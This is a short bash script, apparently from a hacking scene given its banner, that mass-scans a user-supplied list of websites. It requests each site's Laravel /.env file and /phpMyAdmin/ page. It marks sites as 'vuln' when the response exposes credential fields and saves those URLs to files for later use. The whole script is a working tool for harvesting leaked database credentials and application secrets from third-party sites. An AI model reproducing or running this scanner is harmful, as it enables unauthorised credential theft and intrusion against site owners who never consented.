#!/usr/bin/bash
#FellFreeToRecode
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'
LIMITATOR=5
clear
BANNERS () {
printf "
${lightgreen}
=============/////==================\n
root@Love :~$ KindoL ~ 13CHMOD37
[x] Laravel ./env Massed\n
=============/////==================\n
${red}list.txt : http://site.com / site.com
\n
\n
"
}
BANNERS
OPTIONS () {
printf "${red}[>]${white} List                        :${lightgreen} "
read list

printf "${red}[>]${white} Save phpMyAdmin             :${lightgreen} "
read save

printf "${red}[>]${white} Save /.env                  :${lightgreen} "
read sv

site=$(cat $list)
}
OPTIONS
printf "\n${lightgreen}Sek Lurr...\n\n"
for site in $(cat $list);
do
((cthread=cthread%LIMITATOR)); ((cthread++==0)) && wait
if [[ $(curl --connect-timeout 0 --max-time 3 -kLs "${site}/.env" ) =~ "USERNAME" ]]; then
  printf "${white}[+] ${site} is ${lightgreen} vuln\n"
  echo "$site/.env" >> ${sv}

elif [[ $(curl --connect-timeout 0 --max-time 3 -kLs "${site}/phpMyAdmin/" ) =~ "pma_username" ]]; then
  printf "${white}[+] ${site} is ${lightgreen} vuln\n"
  echo "$site/phpMyAdmin" >> ${save}

else
  printf "${white}[+] ${site} is ${red} Bad\n"
fi
done
printf "\n${lightgreen}Save as ${save}...\n\n"
